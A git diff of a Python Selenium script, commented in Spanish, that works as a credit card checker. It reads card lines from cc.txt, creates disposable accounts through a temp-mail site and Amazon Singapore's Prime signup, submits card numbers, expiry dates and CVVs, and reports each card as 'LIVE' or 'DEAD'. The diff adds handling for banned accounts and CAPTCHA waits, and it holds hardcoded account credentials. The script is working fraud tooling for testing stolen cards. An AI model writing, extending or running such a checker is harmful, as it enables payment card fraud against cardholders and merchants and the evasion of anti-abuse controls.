@@ -1,3 +1,4 @@
+import functools
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.common import by
@@ -13,6 +14,7 @@ from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.common.action_chains import ActionChains
 from colorama import *
 from playsound import playsound
+from functools import lru_cache
 from selenium.common.exceptions import *
 import random
 import requests
@@ -21,8 +23,10 @@ import names
 import sys
 import os
 
+
 class Chek:
     
+
     def __init__(self, a):
 
         if a == True:
@@ -31,54 +35,53 @@ class Chek:
                 init()      # Inicializa todos las referencias como paquetes
                 #sys.tracebacklimit = 0     #Manejo de excepcioneswa
                 #Carga el archivo cc.txt
-                self.ccs = open("cc.txt", "r+").readlines()
-                self.indice_ultima = len(self.ccs) - 1
 
                 self.webdriver_chromeoptions()   #Carga las opciones del navegador y retorna las opciones
 
+                #Temp page
                 path = f'{os.path.dirname(os.path.realpath(__file__))}\chromedriver.exe'
                 self.__browser221 = webdriver.Chrome(path, options=self.chrome_options)   #Crea la interfaz con las opciones
                 self.__browser221.get("https://tempm.com/hasevo.com") #Carga la web
                 self.tempmail()  #Extrae datos del mail
 
+                #Amazon page
                 self.__driver = webdriver.Chrome(path, options=self.chrome_options)   #Crea interfaz con las opciones
                 self.__driver.get("https://www.amazon.sg/gp/prime/pipeline/membersignup")  #Carga la web 
-                self.nerro = 0          #Contador de errores que se usa en self.error_register()
+                self.nerro = 0          #Contador de errores que se usa en self.warning_amazon()
                 self.registroamazon()    #Se registra en amazon
-
-                self.crearlinea()    #Toma una linea de cc.txt
+                
 
             except WebDriverException as ex:
                 print(Fore.RED, ex.msg)
         else:
+
             self.load_cctxt()
             self.crearlinea()
             self.crearlinea()
 
-            path = f'{os.path.dirname(os.path.realpath(__file__))}\chromedriver.exe'
             self.webdriver_chromeoptions()
+            path = f'{os.path.dirname(os.path.realpath(__file__))}\chromedriver.exe'
             self.__driver = webdriver.Chrome(path, options=self.chrome_options)
             self.__driver.get('https://www.amazon.sg/gp/prime/pipeline/membersignup')
-            self.__driver.find_element(By.ID, 'ap_email').send_keys('3132122944')
+            self.__driver.find_element(By.ID, 'ap_email').send_keys('3132121715')
             self.__driver.find_element(By.ID, 'ap_password').send_keys('Elian123')
             self.__driver.find_element(By.ID, 'signInSubmit').click()
+            
+
+            #añadir cc
             self.__driver.find_element(By.LINK_TEXT, 'Add a credit or debit card').click()
-            #WebDriverWait(self.__driver, 30).until(EC.frame_to_be_available_and_switch_to_it((By.ID, 'pp-EY0PvP-44')))
             sleep(2)
             self.__driver.switch_to.frame(self.__driver.find_element_by_xpath(".//iframe[contains(@name,'ApxSecureIframe')]"))
 
-
-
-
-
-
-
-
-
-
             self.fillcc1()
-        
-   #Crea el Email
+            
+            #cache
+            
+            self.crearlinea.cache_clear()            
+            
+    
+
+    #Crea el Email
     def tempmail(self):
 
         self.__browser221.implicitly_wait(30)  #Espera 30 segundos o hasta que cargue
@@ -95,6 +98,7 @@ class Chek:
         self.indice_ultima = len(self.ccs) - 1
         self.count_cc = self.indice_ultima
 
+    @lru_cache
     def crearlinea(self):
 
         file = [s.rstrip() for s in self.ccs]
@@ -125,8 +129,9 @@ class Chek:
         email2 = email1[0] + "+" + str(x) + "@" + email1[1]
         print(Fore.GREEN + email2)
 
-    def pagar(self):
-        self.__driver.find_element(By.XPATH, '//*[@id="a-autoid-0"]/span/input').click()
+    def pagar(self):                     
+        sleep(2)
+        self.__driver.find_element(By.XPATH, '/html/body/div[1]/div[2]/div/div[3]/div[3]/div/div/div[1]/span/span/input').click()
         timer1 = threading.Timer(4, self.verificar)     
         timer1.start()
     def recheck(self):
@@ -154,15 +159,28 @@ class Chek:
         bodyText = self.__driver.find_element_by_tag_name('body').text
         if "There was an error validating your payment method. Please update or add a new payment method and try again." in bodyText:
             print(Fore.RED + " DEAD " + self.cc1 +"|"+ self.mes +"|"+self.anio +"|" + self.cvv )
-            self.remover_ultima()
             self.crearlinea()
             timer2 = threading.Timer(4, self.recheck)
             timer2.start()
-        elif "You can now enjoy FREE delivery on millions of Prime eligible items, strself.eam thousands of movies and TV episodes on Prime Video, get free in game content with Twitch Prime and more." in bodyText:
-            playsound('HIT.wav')
-            print(Fore.GREEN + " LIVE " + self.cc1 +"|"+ self.mes +"|"+self.anio +"|" + self.cvv )
-            notify = Notify()
-            notify.send(" LIVE " + self.cc1 +"|"+ self.mes +"|"+self.anio +"|" + self.cvv) 
+        elif "You can now enjoy FREE delivery on millions of Prime eligible items, stream thousands of movies and TV episodes on Prime Video, get free in game content with Prime Gaming and more." in bodyText:
+            
+            self.__driver.quit()
+            self.webdriver_chromeoptions()
+            path = f'{os.path.dirname(os.path.realpath(__file__))}\chromedriver.exe'
+            self.__driver = webdriver.Chrome(path, options=self.chrome_options)
+            self.__driver.get('https://www.amazon.sg/gp/prime/pipeline/membersignup')
+            self.__driver.find_element(By.ID, 'ap_email').send_keys('3132121715')
+            self.__driver.find_element(By.ID, 'ap_password').send_keys('Elian123')
+            self.__driver.find_element(By.ID, 'signInSubmit').click()
+            
+            ms = self.__driver.find_element(By.TAG_NAME, 'body').text
+            if 'Account on hold temporarily' in ms:
+                print(Fore.RED, 'Cuenta baneada')
+            else:
+                playsound('HIT.wav')
+                print(Fore.GREEN + " LIVE " + self.cc1 +"|"+ self.mes +"|"+self.anio +"|" + self.cvv )
+                notify = Notify()
+                notify.send(" LIVE " + self.cc1 +"|"+ self.mes +"|"+self.anio +"|" + self.cvv) 
             
 
     def fillcc1(self):
@@ -201,16 +219,18 @@ class Chek:
 
         WebDriverWait(self.__driver, 30).until(EC.presence_of_element_located((By.ID, "pp-nex5Ut-43")))
         self.__driver.find_element(By.ID, 'pp-nex5Ut-43').click()
+        self.registroamazon.cache_clear()
+        self.warning_amazon.cache_clear()
         self.fillcc1()
-        
-    def error_register(self):
+
+    @lru_cache  
+    def warning_amazon(self):
 
         bodyText0 = self.__driver.find_element_by_tag_name('body').text
 
         #Lee los mensajes de erro y si no hay pasa al otp
         if "Internal Error. Please try again later." in bodyText0:
             if self.nerro == 3:
-                print(Fore.RED, "Error al llenar el formulario")
                 return False
             else:
                 self.nerro += 1
@@ -220,8 +240,7 @@ class Chek:
                 self.__driver.get("https://www.amazon.sg/gp/prime/pipeline/membersignup")
                 self.registroamazon()
         elif "Solve this puzzle to protect your account" in bodyText0:
-            print(Fore.YELLOW + "CAPTCHA FOUND, NEXT TIME CHANGE IP")
-            print(Fore.BLUE + "WAIT UNTIL CAPTCHA SOLVED")
+            print(Fore.BLUE + "WAITING UNTIL CAPTCHA SOLVED")
             return True
         elif "Verify email address" in bodyText0: 
             try:
@@ -233,9 +252,9 @@ class Chek:
 
         else:
             sleep(3)
-            self.error_register()
+            self.warning_amazon()
         
-
+    @lru_cache
     def registroamazon(self):
 
         print(Fore.CYAN +"SIGNING UP ACCOUNT ")
@@ -253,8 +272,8 @@ class Chek:
 
         #espera a que cargue la ventana de captcha
         self.__driver.implicitly_wait(10)
-        er = self.error_register()    #Revisa si hay errores en el formulario
-        if er != False:
+        er = self.warning_amazon()    #Revisa si hay errores en el formulario
+        if er == True:
             # Cambia el foco al iframe
             self.__driver.switch_to.frame(self.__driver.find_element_by_xpath('//*[@id="cvf-arkose-frame"]'))     #Primer frame
             self.__driver.switch_to.frame(self.__driver.find_element_by_xpath('//*[@id="fc-iframe-wrap"]'))       #Segundo frame
@@ -264,14 +283,14 @@ class Chek:
             self.__driver.switch_to.default_content()
             
             #Espera respuestas al aceptar el captcha
-            WebDriverWait(self.__driver, 120).until(EC.presence_of_element_located((By.ID, "cvf-input-code")))
-            er = self.error_register()    #Revisa si hay errores en el formulario
-            if er != False:
-
-                pass
             
-            else:
+            WebDriverWait(self.__driver, 120).until(EC.presence_of_element_located((By.ID, "cvf-input-code")))
+            er = self.warning_amazon()    #Revisa si hay errores en el formulario
+            if er == False:
                 print(Fore.RED, "Tiempo de espera de OTP number extendido")
+        else:
+            print(Fore.RED, "Error al llenar el formulario")
+                
 
     def webdriver_chromeoptions(self):
         #Inica el API WEBDRIVER CHROME para ajustar las opciones
